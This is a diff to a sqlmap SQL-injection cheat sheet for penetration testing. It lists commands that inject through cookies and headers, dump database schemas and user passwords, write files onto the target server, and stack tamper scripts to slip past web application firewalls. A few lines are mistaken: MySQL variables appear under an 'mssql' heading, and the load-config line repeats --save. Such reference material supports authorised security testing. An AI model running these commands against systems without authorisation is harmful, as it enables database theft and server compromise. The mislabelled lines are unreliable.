@@ -1,7 +1,7 @@
 # SQLMAP
 
 % sql injection
-#plateform/linux #target/remote #cat/ATTACK/INJECTION  #port/80 #port/443 #port/8080 #port/8443
+#plateform/linux #target/remote #cat/ATTACK/INJECTION #port/80 #port/443 #port/8080 #port/8443
 
 ## usage
 ```
@@ -15,15 +15,15 @@ https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-s
 
 ## flush session files
 ```
---flush-session     # Flush session files for current target
---fresh-queries     # Ignore query results stored in session file
+--flush-session # Flush session files for current target
+--fresh-queries # Ignore query results stored in session file
 ```
 
 ## HTTP protocol authentication
 types: 
-    Basic
-    Digest
-    NTLM
+ Basic
+ Digest
+ NTLM
 ```
 --auth-type <auth_type|Basic> --auth-cred "<login>:<password>"
 --headers="Authorization: Basic <value>"
@@ -64,7 +64,7 @@ cat auth_file.key auth_file.pem > auth_file.txt
 ## injections in Headers and other HTTP Method
 ```
 #Inside cookie
-sqlmap  -u "http://example.com" --cookie "mycookies=*"
+sqlmap -u "http://example.com" --cookie "mycookies=*"
 
 #Inside some header
 sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
@@ -100,6 +100,18 @@ sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
 -sql-query "<query>"
 ```
 
+## mssql - dump environnement valiables
+```
+--sql-query 'SELECT @@datadir, @@innodb_data_home_dir, @@innodb_log_group_home_dir, @@tmpdir;'
+```
+
+## mssql - write/write enabled
+si 0 alors disabled
+```
+--sql-query 'SELECT @@secure_file_priv IS NOT NULL';
+```
+
+
 ## DBMS
 MySQL
 Oracle
@@ -110,8 +122,16 @@ Microsoft Access
 --dbms="<name>"
 ```
 
+## save / load config
+```
+--save $(pwd)<name>.ini
+--save $(pwd)<name>.ini
+```
+
+
 ## Enumeration
 ```
+--schema --exclude-sysdbs
 --dbs
 -D <database_name> --tables
 -D <database_name> -T <table> --dump
@@ -123,6 +143,11 @@ Microsoft Access
 --users #Get usernames od DB
 --passwords #Get passwords of users in DB
 --privileges #Get privileges
+```
+
+## filesystem enumeration
+```
+--common-files
 ```
 
 
@@ -141,8 +166,6 @@ Microsoft Access
 sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
 ```
 
-
-
 ## get with cookie
 ```
 sqlmap -u <url> --cookie=<cookie>
@@ -150,20 +173,20 @@ sqlmap -u <url> --cookie=<cookie>
 
 ## sqlmap - classic with tamper
 ```
-sqlmap -u '<url>' tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+sqlmap -u '<url>' tamper="apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes"
 ```
 
 ## sqlmap - hardcore
 ```
-sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"
 ```
 
 ## sqlmap - mysql tamper list
 ```
-sqlmap -u <url> --dbms=MYSQL tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+sqlmap -u <url> --dbms=MYSQL tamper="between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes"
 ```
 
 ## sqlmap - mssql tamper list
 ```
-sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+sqlmap -u <url> --dbms=MSSQL tamper="between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"
 ```
